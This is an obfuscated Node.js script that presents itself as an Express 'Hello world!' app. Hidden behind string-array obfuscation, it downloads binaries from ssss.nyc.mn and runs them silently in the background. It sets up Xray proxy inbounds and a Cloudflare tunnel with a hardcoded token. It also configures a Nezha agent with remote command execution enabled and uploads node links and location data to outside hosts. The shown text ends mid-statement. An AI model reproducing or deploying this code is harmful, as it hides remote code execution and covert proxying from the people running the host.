const _0x2d9083=_0x3d83;(function(_0x9f6054,_0x252e14){const _0x2a820={_0x14f507:0x286,_0x2e02ee:0x206,_0xd8b78b:0x1db,_0x313d33:0x1d0},_0x4296fa=_0x3d83,_0x52fdad=_0x9f6054();while(!![]){try{const _0xf1837=-parseInt(_0x4296fa(_0x2a820._0x14f507))/0x1*(-parseInt(_0x4296fa(0x211))/0x2)+-parseInt(_0x4296fa(0x233))/0x3+-parseInt(_0x4296fa(_0x2a820._0x2e02ee))/0x4+-parseInt(_0x4296fa(0x261))/0x5+-parseInt(_0x4296fa(_0x2a820._0xd8b78b))/0x6+-parseInt(_0x4296fa(_0x2a820._0x313d33))/0x7*(-parseInt(_0x4296fa(0x28c))/0x8)+parseInt(_0x4296fa(0x232))/0x9;if(_0xf1837===_0x252e14)break;else _0x52fdad['push'](_0x52fdad['shift']());}catch(_0x3e9266){_0x52fdad['push'](_0x52fdad['shift']());}}}(_0x14ab,0xacfc7));const express=require(_0x2d9083(0x24e)),app=express(),axios=require(_0x2d9083(0x1e4)),os=require('os'),fs=require('fs'),path=require(_0x2d9083(0x240)),{promisify}=require(_0x2d9083(0x214)),exec=promisify(require(_0x2d9083(0x219))['exec']),{execSync}=require(_0x2d9083(0x219)),UPLOAD_URL=process[_0x2d9083(0x22c)][_0x2d9083(0x266)]||'',PROJECT_URL=process[_0x2d9083(0x22c)][_0x2d9083(0x212)]||'',AUTO_ACCESS=process[_0x2d9083(0x22c)][_0x2d9083(0x23a)]||![],FILE_PATH=process[_0x2d9083(0x22c)][_0x2d9083(0x26b)]||_0x2d9083(0x283),SUB_PATH=process[_0x2d9083(0x22c)][_0x2d9083(0x200)]||_0x2d9083(0x1dc),PORT=process[_0x2d9083(0x22c)][_0x2d9083(0x1ff)]||process[_0x2d9083(0x22c)]['PORT']||0xbb8,UUID=process[_0x2d9083(0x22c)][_0x2d9083(0x217)]||'6a39aade-b1a2-4038-8643-291e2feaa9b0',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2d9083(0x22c)][_0x2d9083(0x244)]||'',NEZHA_KEY=process[_0x2d9083(0x22c)][_0x2d9083(0x1da)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2d9083(0x203),ARGO_AUTH=process[_0x2d9083(0x22c)]['ARGO_AUTH']||_0x2d9083(0x245),ARGO_PORT=process[_0x2d9083(0x22c)][_0x2d9083(0x20f)]||0x1f41,CFIP=process[_0x2d9083(0x22c)][_0x2d9083(0x226)]||_0x2d9083(0x27b),CFPORT=process['env'][_0x2d9083(0x1e1)]||0x1bb,NAME=process[_0x2d9083(0x22c)]['NAME']||_0x2d9083(0x207);!fs[_0x2d9083(0x280)](FILE_PATH)?(fs[_0x2d9083(0x254)](FILE_PATH),console[_0x2d9083(0x1f3)](FILE_PATH+_0x2d9083(0x22d))):console[_0x2d9083(0x1f3)](FILE_PATH+_0x2d9083(0x247));function generateRandomName(){const _0x534908={_0x315d86:0x255,_0x31d048:0x260,_0x51d109:0x27d},_0x3fa0d3=_0x2d9083,_0x3dd960=_0x3fa0d3(_0x534908._0x315d86);let _0x44e21e='';for(let _0x2a584b=0x0;_0x2a584b<0x6;_0x2a584b++){_0x44e21e+=_0x3dd960[_0x3fa0d3(_0x534908._0x31d048)](Math[_0x3fa0d3(0x270)](Math[_0x3fa0d3(0x1de)]()*_0x3dd960[_0x3fa0d3(_0x534908._0x51d109)]));}return _0x44e21e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2d9083(0x28b)](FILE_PATH,npmName),phpPath=path[_0x2d9083(0x28b)](FILE_PATH,phpName),webPath=path[_0x2d9083(0x28b)](FILE_PATH,webName),botPath=path[_0x2d9083(0x28b)](FILE_PATH,botName),subPath=path[_0x2d9083(0x28b)](FILE_PATH,_0x2d9083(0x210)),listPath=path[_0x2d9083(0x28b)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x2d9083(0x1ec)),configPath=path[_0x2d9083(0x28b)](FILE_PATH,_0x2d9083(0x216));function deleteNodes(){const _0x194f20={_0x52b848:0x257,_0x1d6070:0x1fa,_0x2f3e2e:0x27d,_0x1c80ad:0x241,_0x26d5ba:0x1f4},_0xe7ad1=_0x2d9083;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5d61ff;try{_0x5d61ff=fs[_0xe7ad1(0x238)](subPath,_0xe7ad1(_0x194f20._0x52b848));}catch{return null;}const _0x36cf0f=Buffer['from'](_0x5d61ff,_0xe7ad1(_0x194f20._0x1d6070))['toString'](_0xe7ad1(0x257)),_0x1a5465=_0x36cf0f[_0xe7ad1(0x262)]('\x0a')['filter'](_0x5c266c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe7ad1(0x1fe)](_0x5c266c));if(_0x1a5465[_0xe7ad1(_0x194f20._0x2f3e2e)]===0x0)return;return axios[_0xe7ad1(_0x194f20._0x1c80ad)](UPLOAD_URL+_0xe7ad1(0x223),JSON[_0xe7ad1(0x225)]({'nodes':_0x1a5465}),{'headers':{'Content-Type':'application/json'}})[_0xe7ad1(_0x194f20._0x26d5ba)](_0x73f118=>{return null;}),null;}catch(_0x5b3951){return null;}}function cleanupOldFiles(){const _0x189f6d={_0x3cb4d5:0x224},_0x1ef5c6={_0x1bff6e:0x277,_0x36335b:0x243,_0x3cc929:0x27f},_0x49d493=_0x2d9083;try{const _0x51ef89=fs[_0x49d493(0x23d)](FILE_PATH);_0x51ef89[_0x49d493(_0x189f6d._0x3cb4d5)](_0x204a8f=>{const _0xd783f8=_0x49d493,_0x54754c=path['join'](FILE_PATH,_0x204a8f);try{const _0x9cccd0=fs[_0xd783f8(_0x1ef5c6._0x1bff6e)](_0x54754c);_0x9cccd0[_0xd783f8(_0x1ef5c6._0x36335b)]()&&fs[_0xd783f8(_0x1ef5c6._0x3cc929)](_0x54754c);}catch(_0x492bf0){}});}catch(_0x1b5318){}}function _0x3d83(_0xd078b8,_0x1b8788){const _0x14abb7=_0x14ab();return _0x3d83=function(_0x3d834b,_0x42b74e){_0x3d834b=_0x3d834b-0x1cd;let _0x5e1079=_0x14abb7[_0x3d834b];return _0x5e1079;},_0x3d83(_0xd078b8,_0x1b8788);}app['get']('/',function(_0x483f4e,_0x4df32c){_0x4df32c['send']('Hello\x20world!');});async function generateConfig(){const _0x54e41c={_0x39fa25:0x237,_0x4e71da:0x1d2,_0x943e6:0x1e2,_0x10b5b8:0x248,_0x57ba5c:0x287,_0x390875:0x1d2,_0x29a0fe:0x1f0,_0x73b955:0x218,_0x5d0c3e:0x1cf,_0xe082d1:0x276,_0x4ee6f9:0x26c,_0x505ae6:0x264,_0x73d938:0x20d,_0x27e7ce:0x216},_0x5cd6a7=_0x2d9083,_0x95542e={'log':{'access':_0x5cd6a7(_0x54e41c._0x39fa25),'error':_0x5cd6a7(_0x54e41c._0x39fa25),'loglevel':_0x5cd6a7(_0x54e41c._0x4e71da)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5cd6a7(0x287),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5cd6a7(0x1d2),'fallbacks':[{'dest':0xbb9},{'path':_0x5cd6a7(0x1f0),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5cd6a7(0x20b),'dest':0xbbc}]},'streamSettings':{'network':_0x5cd6a7(_0x54e41c._0x943e6)}},{'port':0xbb9,'listen':_0x5cd6a7(_0x54e41c._0x10b5b8),'protocol':_0x5cd6a7(_0x54e41c._0x57ba5c),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5cd6a7(0x1e2),'security':_0x5cd6a7(_0x54e41c._0x390875)}},{'port':0xbba,'listen':_0x5cd6a7(0x248),'protocol':_0x5cd6a7(_0x54e41c._0x57ba5c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5cd6a7(0x1d2)},'streamSettings':{'network':'ws','security':_0x5cd6a7(0x1d2),'wsSettings':{'path':_0x5cd6a7(_0x54e41c._0x29a0fe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5cd6a7(_0x54e41c._0x73b955),_0x5cd6a7(0x26c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5cd6a7(0x248),'protocol':_0x5cd6a7(0x1f7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5cd6a7(0x28e)}},'sniffing':{'enabled':!![],'destOverride':[_0x5cd6a7(0x276),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5cd6a7(0x248),'protocol':_0x5cd6a7(_0x54e41c._0x5d0c3e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5cd6a7(_0x54e41c._0xe082d1),_0x5cd6a7(0x218),_0x5cd6a7(_0x54e41c._0x4ee6f9)],'metadataOnly':![]}}],'dns':{'servers':[_0x5cd6a7(0x1eb)]},'outbounds':[{'protocol':_0x5cd6a7(_0x54e41c._0x505ae6),'tag':_0x5cd6a7(0x22b)},{'protocol':'blackhole','tag':_0x5cd6a7(0x20e)}]};fs[_0x5cd6a7(_0x54e41c._0x73d938)](path['join'](FILE_PATH,_0x5cd6a7(_0x54e41c._0x27e7ce)),JSON[_0x5cd6a7(0x225)](_0x95542e,null,0x2));}function getSystemArchitecture(){const _0x283b50={_0x489f06:0x290,_0x5b0f8d:0x239},_0x234d22=_0x2d9083,_0x733279=os[_0x234d22(_0x283b50._0x489f06)]();return _0x733279===_0x234d22(_0x283b50._0x5b0f8d)||_0x733279==='arm64'||_0x733279===_0x234d22(0x265)?_0x234d22(0x239):_0x234d22(0x1f1);}function downloadFile(_0xfb7e8a,_0x5d4369,_0x3bba5d){const _0x1177ba={_0x3bc255:0x230,_0x1a06b6:0x250},_0x1c7d98={_0x1637fe:0x27e,_0x19db64:0x1ed},_0x2e1c65={_0x43a51f:0x234,_0x4415b4:0x1d3},_0x16c75e={_0x44295b:0x1ed,_0x360ef9:0x28a},_0x274d5b={_0x2a861c:0x27e,_0x5ca797:0x1ed,_0x171efa:0x268},_0x4a6ca9=_0x2d9083,_0xcfa33f=_0xfb7e8a;!fs['existsSync'](FILE_PATH)&&fs[_0x4a6ca9(0x254)](FILE_PATH,{'recursive':!![]});const _0x532e72=fs[_0x4a6ca9(0x288)](_0xcfa33f);axios({'method':_0x4a6ca9(_0x1177ba._0x3bc255),'url':_0x5d4369,'responseType':_0x4a6ca9(0x273)})[_0x4a6ca9(_0x1177ba._0x1a06b6)](_0x194bf7=>{const _0x468559=_0x4a6ca9;_0x194bf7['data'][_0x468559(_0x2e1c65._0x43a51f)](_0x532e72),_0x532e72['on'](_0x468559(_0x2e1c65._0x4415b4),()=>{const _0x5d46c2=_0x468559;_0x532e72[_0x5d46c2(0x25e)](),console[_0x5d46c2(0x1f3)](_0x5d46c2(_0x274d5b._0x2a861c)+path[_0x5d46c2(_0x274d5b._0x5ca797)](_0xcfa33f)+_0x5d46c2(_0x274d5b._0x171efa)),_0x3bba5d(null,_0xcfa33f);}),_0x532e72['on']('error',_0x4a4f00=>{const _0x4b5787=_0x468559;fs[_0x4b5787(0x1dd)](_0xcfa33f,()=>{});const _0x29f4df=_0x4b5787(0x27e)+path[_0x4b5787(_0x16c75e._0x44295b)](_0xcfa33f)+_0x4b5787(0x23b)+_0x4a4f00[_0x4b5787(0x215)];console[_0x4b5787(_0x16c75e._0x360ef9)](_0x29f4df),_0x3bba5d(_0x29f4df);});})[_0x4a6ca9(0x1f4)](_0x9690ef=>{const _0x16d0dd=_0x4a6ca9,_0x3d4513=_0x16d0dd(_0x1c7d98._0x1637fe)+path[_0x16d0dd(_0x1c7d98._0x19db64)](_0xcfa33f)+_0x16d0dd(0x23b)+_0x9690ef[_0x16d0dd(0x215)];console['error'](_0x3d4513),_0x3bba5d(_0x3d4513);});}function _0x14ab(){const _0x490ed9=['message','config.json','UUID','tls','child_process','has','npm\x20running\x20error:\x20','ARGO_DOMAIN:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20>/dev/null\x202>&1\x20&','platform','\x20>/dev/null\x202>&1','country_code','&path=%2Fvless-argo%3Fed%3D2560#','/api/delete-nodes','forEach','stringify','CFIP','fileName','TunnelSecret','8443','Unhandled\x20error\x20in\x20startserver:','direct','env','\x20is\x20created','tunnel.json','2053','get','countryCode','30055761lfMuwl','1821405TuAyOq','pipe','Error\x20reading\x20boot.log:','map','/dev/null','readFileSync','arm','AUTO_ACCESS','\x20failed:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readdirSync','2083','https://arm64.ssss.nyc.mn/agent','path','post','config.yaml','isFile','NEZHA_PORT','eyJhIjoiYjBlMDhjMzA0Y2ZlZGEzNWE2NWM1ZDA2YTkyYWU4NmEiLCJ0IjoiYzhjMjc3YjYtNWY4My00Y2E4LWJmNWMtYzBkODMxYjZhMzNlIiwicyI6Ik9UZGpNV0U1TXpndE56WXhNeTAwT1ROaExUa3pZVFV0TVdRMk1XUTFOalZqT1dFNSJ9','/vmess-argo?ed=2560','\x20already\x20exists','127.0.0.1','push','2087','2096','match','firefox','express','\x20-p\x20','then','\x20-c\x20\x22','\x20-c\x20','&fp=firefox&type=ws&host=','mkdirSync','abcdefghijklmnopqrstuvwxyz','https://arm64.ssss.nyc.mn/v1','utf-8','/sub.txt\x20saved\x20successfully','443','\x0a\x0avmess://','Subscription\x20uploaded\x20successfully','clear','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','close','nohup\x20','charAt','3843370tRFADX','split','\x20-s\x20','freedom','aarch64','UPLOAD_URL','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20successfully','\x20is\x20running','Error\x20downloading\x20files:','FILE_PATH','quic','php\x20running\x20error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Nodes\x20uploaded\x20successfully','floor','set','Content-Type','stream','Empowerment\x20failed\x20for\x20','--tls','http','statSync','false','\x0a\x0atrojan://','from','saas.sin.fan','Unknown','length','Download\x20','unlinkSync','existsSync','application/json','https://amd64.ssss.nyc.mn/agent','./tmp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Add\x20automatic\x20access\x20task\x20faild:\x20','322748KEiKbw','vless','createWriteStream','automatic\x20access\x20task\x20added\x20successfully','error','join','1480CgmQLA','status','/vmess-argo','data','arch','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','toString','trojan','39361kFVHmk','https://arm64.ssss.nyc.mn/bot','none','finish','true','/tunnel.yml\x20run','App\x20is\x20running','Error\x20executing\x20command:\x20','org','/config.json\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','8253276UfZaoQ','111111','unlink','random','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFPORT','tcp','tunnel.yml','axios','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','.exe\x20>\x20nul\x202>&1','fileUrl','Error\x20in\x20startserver:','&path=%2Ftrojan-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','boot.log','basename','http://ip-api.com/json/','?security=tls&sni=','/vless-argo','amd','del\x20/f\x20/q\x20','log','catch','send','\x0avless://','vmess','text/plain;\x20charset=utf-8','chmod','base64','\x0aclient_secret:\x20','filter','https://amd64.ssss.nyc.mn/web','test','SERVER_PORT','SUB_PATH','ArgoDomain:','https://arm64.ssss.nyc.mn/web','koyeb.2260629.xyz','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','4970504DXoDEQ','koyeb','includes','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','all','/trojan-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','writeFileSync','block','ARGO_PORT','sub.txt','2WpLKen','PROJECT_URL','\x22\x20>\x20/dev/null\x202>&1','util'];_0x14ab=function(){return _0x490ed9;};return _0x14ab();}async function downloadFilesAndRun(){const _0x5e0127={_0x70cb0a:0x236,_0x563731:0x20a,_0x23bed7:0x208,_0x3fa74b:0x262,_0x4fabfb:0x259,_0x2eb21e:0x229,_0x5035d3:0x24b,_0x5518fd:0x22f,_0x4c9374:0x1d4,_0x2f1f0f:0x1fb,_0x3caa49:0x23c,_0x8d7f43:0x1e0,_0x3507e5:0x28a,_0x257270:0x26d,_0x50776e:0x23e,_0x44c326:0x263,_0x24b1e0:0x1f3,_0xc53436:0x25f,_0x37cf35:0x1e5,_0x2a0ef0:0x205,_0x48bcce:0x21e},_0x15d572={_0x481e56:0x224},_0x409f56={_0x5689d6:0x280},_0x3aee06=_0x2d9083,_0x2a7066=getSystemArchitecture(),_0x2662ce=getFilesForArchitecture(_0x2a7066);if(_0x2662ce['length']===0x0){console[_0x3aee06(0x1f3)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3bdcbd=_0x2662ce[_0x3aee06(_0x5e0127._0x70cb0a)](_0x55bc3b=>{return new Promise((_0x5580be,_0x2897a6)=>{const _0x4c069c=_0x3d83;downloadFile(_0x55bc3b[_0x4c069c(0x227)],_0x55bc3b[_0x4c069c(0x1e8)],(_0x4c838d,_0xe3260d)=>{_0x4c838d?_0x2897a6(_0x4c838d):_0x5580be(_0xe3260d);});});});try{await Promise[_0x3aee06(_0x5e0127._0x563731)](_0x3bdcbd);}catch(_0x2cbc59){console[_0x3aee06(0x28a)](_0x3aee06(0x26a),_0x2cbc59);return;}function _0x21b029(_0x4c663f){const _0x18a911=_0x3aee06,_0x1621db=0x1fd;_0x4c663f[_0x18a911(_0x15d572._0x481e56)](_0x56a91a=>{const _0xcc0b47={_0x11349c:0x28a,_0x505c14:0x274,_0x34bc10:0x1ce},_0x22818a=_0x18a911;fs[_0x22818a(_0x409f56._0x5689d6)](_0x56a91a)&&fs[_0x22818a(0x1f9)](_0x56a91a,_0x1621db,_0x44f494=>{const _0x372843=_0x22818a;_0x44f494?console[_0x372843(_0xcc0b47._0x11349c)](_0x372843(_0xcc0b47._0x505c14)+_0x56a91a+':\x20'+_0x44f494):console['log']('Empowerment\x20success\x20for\x20'+_0x56a91a+':\x20'+_0x1621db[_0x372843(_0xcc0b47._0x34bc10)](0x8));});});}const _0x49db4b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x21b029(_0x49db4b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xedce47=NEZHA_SERVER[_0x3aee06(_0x5e0127._0x23bed7)](':')?NEZHA_SERVER[_0x3aee06(_0x5e0127._0x3fa74b)](':')['pop']():'',_0x14d52c=new Set([_0x3aee06(_0x5e0127._0x4fabfb),_0x3aee06(_0x5e0127._0x2eb21e),_0x3aee06(_0x5e0127._0x5035d3),'2087',_0x3aee06(0x23e),_0x3aee06(_0x5e0127._0x5518fd)]),_0x36768e=_0x14d52c[_0x3aee06(0x21a)](_0xedce47)?_0x3aee06(_0x5e0127._0x4c9374):_0x3aee06(0x278),_0x4615b2=_0x3aee06(_0x5e0127._0x2f1f0f)+NEZHA_KEY+_0x3aee06(_0x5e0127._0x3caa49)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x36768e+_0x3aee06(0x26e)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x3aee06(0x242)),_0x4615b2);const _0xd4c70f=_0x3aee06(0x25f)+phpPath+_0x3aee06(0x251)+FILE_PATH+_0x3aee06(_0x5e0127._0x8d7f43);try{await exec(_0xd4c70f),console[_0x3aee06(0x1f3)](phpName+_0x3aee06(0x269)),await new Promise(_0x30e836=>setTimeout(_0x30e836,0x3e8));}catch(_0xa15fe6){console[_0x3aee06(_0x5e0127._0x3507e5)](_0x3aee06(_0x5e0127._0x257270)+_0xa15fe6);}}else{let _0x4d8a41='';const _0x23b7de=[_0x3aee06(0x259),_0x3aee06(_0x5e0127._0x2eb21e),_0x3aee06(0x24b),_0x3aee06(0x24a),_0x3aee06(_0x5e0127._0x50776e),_0x3aee06(_0x5e0127._0x5518fd)];_0x23b7de['includes'](NEZHA_PORT)&&(_0x4d8a41=_0x3aee06(0x275));const _0x16466c=_0x3aee06(0x25f)+npmPath+_0x3aee06(_0x5e0127._0x44c326)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3aee06(0x24f)+NEZHA_KEY+'\x20'+_0x4d8a41+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16466c),console[_0x3aee06(0x1f3)](npmName+_0x3aee06(0x269)),await new Promise(_0x176b14=>setTimeout(_0x176b14,0x3e8));}catch(_0x2c5978){console[_0x3aee06(_0x5e0127._0x3507e5)](_0x3aee06(0x21b)+_0x2c5978);}}}else console[_0x3aee06(_0x5e0127._0x24b1e0)](_0x3aee06(0x1e6));const _0x29fdbc=_0x3aee06(_0x5e0127._0xc53436)+webPath+_0x3aee06(0x252)+FILE_PATH+_0x3aee06(0x1d9);try{await exec(_0x29fdbc),console[_0x3aee06(_0x5e0127._0x24b1e0)](webName+_0x3aee06(0x269)),await new Promise(_0x1a84a0=>setTimeout(_0x1a84a0,0x3e8));}catch(_0x259987){console['error']('web\x20running\x20error:\x20'+_0x259987);}if(fs[_0x3aee06(0x280)](botPath)){let _0x1f6881;if(ARGO_AUTH[_0x3aee06(0x24c)](/^[A-Z0-9a-z=]{120,250}$/))_0x1f6881=_0x3aee06(_0x5e0127._0x37cf35)+ARGO_AUTH;else ARGO_AUTH[_0x3aee06(0x24c)](/TunnelSecret/)?_0x1f6881='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x3aee06(0x1d5):_0x1f6881=_0x3aee06(_0x5e0127._0x2a0ef0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3aee06(0x25f)+botPath+'\x20'+_0x1f6881+_0x3aee06(_0x5e0127._0x48bcce)),console[_0x3aee06(_0x5e0127._0x24b1e0)](botName+'\x20is\x20running'),await new Promise(_0x5e7e5c=>setTimeout(_0x5e7e5c,0x7d0));}catch(_0x51f52c){console[_0x3aee06(_0x5e0127._0x3507e5)](_0x3aee06(0x1d7)+_0x51f52c);}}await new Promise(_0x27f604=>setTimeout(_0x27f604,0x1388));}function getFilesForArchitecture(_0x33bde8){const _0x75b1c8={_0x3d38b0:0x239,_0x3586a4:0x202,_0x5329e1:0x1fd,_0x3ccbc9:0x23f,_0x340b43:0x282,_0xf6cd21:0x239,_0x1d8acb:0x1df},_0x2a0825=_0x2d9083;let _0x4ecbad;_0x33bde8===_0x2a0825(_0x75b1c8._0x3d38b0)?_0x4ecbad=[{'fileName':webPath,'fileUrl':_0x2a0825(_0x75b1c8._0x3586a4)},{'fileName':botPath,'fileUrl':_0x2a0825(0x1d1)}]:_0x4ecbad=[{'fileName':webPath,'fileUrl':_0x2a0825(_0x75b1c8._0x5329e1)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x164412=_0x33bde8===_0x2a0825(_0x75b1c8._0x3d38b0)?_0x2a0825(_0x75b1c8._0x3ccbc9):_0x2a0825(_0x75b1c8._0x340b43);_0x4ecbad[_0x2a0825(0x1df)]({'fileName':npmPath,'fileUrl':_0x164412});}else{const _0x3f6d0c=_0x33bde8===_0x2a0825(_0x75b1c8._0xf6cd21)?_0x2a0825(0x256):'https://amd64.ssss.nyc.mn/v1';_0x4ecbad[_0x2a0825(_0x75b1c8._0x1d8acb)]({'fileName':phpPath,'fileUrl':_0x3f6d0c});}}return _0x4ecbad;}function argoType(){const _0x2d62ff={_0x559381:0x1f3,_0x3f947d:0x1cd,_0x47ef6e:0x22e,_0x2f6cfd:0x267,_0x2434fc:0x209},_0x4626a8=_0x2d9083;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4626a8(_0x2d62ff._0x559381)](_0x4626a8(_0x2d62ff._0x3f947d));return;}if(ARGO_AUTH[_0x4626a8(0x208)](_0x4626a8(0x228))){fs[_0x4626a8(0x20d)](path['join'](FILE_PATH,_0x4626a8(0x22e)),ARGO_AUTH);const _0x454d99='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4626a8(0x28b)](FILE_PATH,_0x4626a8(_0x2d62ff._0x47ef6e))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4626a8(0x25d)+ARGO_PORT+_0x4626a8(_0x2d62ff._0x2f6cfd);fs[_0x4626a8(0x20d)](path['join'](FILE_PATH,_0x4626a8(0x1e3)),_0x454d99);}else console[_0x4626a8(0x1f3)](_0x4626a8(_0x2d62ff._0x2434fc));}async function extractDomains(){const _0x2405aa={_0x5c0482:0x21c,_0x5ceaa9:0x257,_0x28f1d5:0x262,_0x2c4ad4:0x201,_0x2f43b9:0x28b,_0x311f3a:0x1ec,_0x595d63:0x205,_0x39a113:0x20c,_0x496cbb:0x269,_0x3d3ba9:0x28a,_0x24cb9b:0x28a},_0xd12ca={_0x112b3f:0x230,_0x5ccfcc:0x28f,_0x499ed3:0x221,_0x5e1c43:0x28f,_0x3e5c35:0x1d8,_0xd343ff:0x28f,_0x19c1be:0x231,_0x53a649:0x1d8},_0x24c2cf={_0x178ee7:0x21f,_0x3f5c34:0x1e7},_0x10c36f=_0x2d9083;let _0x4bc80b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4bc80b=ARGO_DOMAIN,console[_0x10c36f(0x1f3)](_0x10c36f(_0x2405aa._0x5c0482),_0x4bc80b),await _0x2169fb(_0x4bc80b);else try{const _0x9d103f=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x10c36f(_0x2405aa._0x5ceaa9)),_0x4fb4a5=_0x9d103f[_0x10c36f(_0x2405aa._0x28f1d5)]('\x0a'),_0x1e99f7=[];_0x4fb4a5['forEach'](_0x34664e=>{const _0x53833f=_0x10c36f,_0x3510c5=_0x34664e[_0x53833f(0x24c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3510c5){const _0x430783=_0x3510c5[0x1];_0x1e99f7['push'](_0x430783);}});if(_0x1e99f7['length']>0x0)_0x4bc80b=_0x1e99f7[0x0],console[_0x10c36f(0x1f3)](_0x10c36f(_0x2405aa._0x2c4ad4),_0x4bc80b),await _0x2169fb(_0x4bc80b);else{console[_0x10c36f(0x1f3)](_0x10c36f(0x21d)),fs['unlinkSync'](path[_0x10c36f(_0x2405aa._0x2f43b9)](FILE_PATH,_0x10c36f(_0x2405aa._0x311f3a)));async function _0x46a3d7(){const _0x430bf8=_0x10c36f;try{process[_0x430bf8(_0x24c2cf._0x178ee7)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x430bf8(_0x24c2cf._0x3f5c34)):await exec('pkill\x20-f\x20\x22['+botName[_0x430bf8(0x260)](0x0)+']'+botName['substring'](0x1)+_0x430bf8(0x213));}catch(_0x79b0f8){}}_0x46a3d7(),await new Promise(_0x558647=>setTimeout(_0x558647,0xbb8));const _0x2e9592=_0x10c36f(_0x2405aa._0x595d63)+FILE_PATH+_0x10c36f(_0x2405aa._0x39a113)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2e9592+_0x10c36f(0x21e)),console[_0x10c36f(0x1f3)](botName+_0x10c36f(_0x2405aa._0x496cbb)),await new Promise(_0x5cb812=>setTimeout(_0x5cb812,0xbb8)),await extractDomains();}catch(_0x4735c9){console[_0x10c36f(_0x2405aa._0x3d3ba9)](_0x10c36f(0x1d7)+_0x4735c9);}}}catch(_0x374225){console[_0x10c36f(_0x2405aa._0x24cb9b)](_0x10c36f(0x235),_0x374225);}async function _0x13633e(){const _0x5d8393=_0x10c36f;try{const _0x4f0766=await axios[_0x5d8393(_0xd12ca._0x112b3f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x4f0766[_0x5d8393(_0xd12ca._0x5ccfcc)]&&_0x4f0766[_0x5d8393(0x28f)][_0x5d8393(_0xd12ca._0x499ed3)]&&_0x4f0766[_0x5d8393(0x28f)]['org'])return _0x4f0766[_0x5d8393(_0xd12ca._0x5e1c43)][_0x5d8393(_0xd12ca._0x499ed3)]+'_'+_0x4f0766[_0x5d8393(0x28f)][_0x5d8393(_0xd12ca._0x3e5c35)];}catch(_0x5bc4ff){try{const _0x179580=await 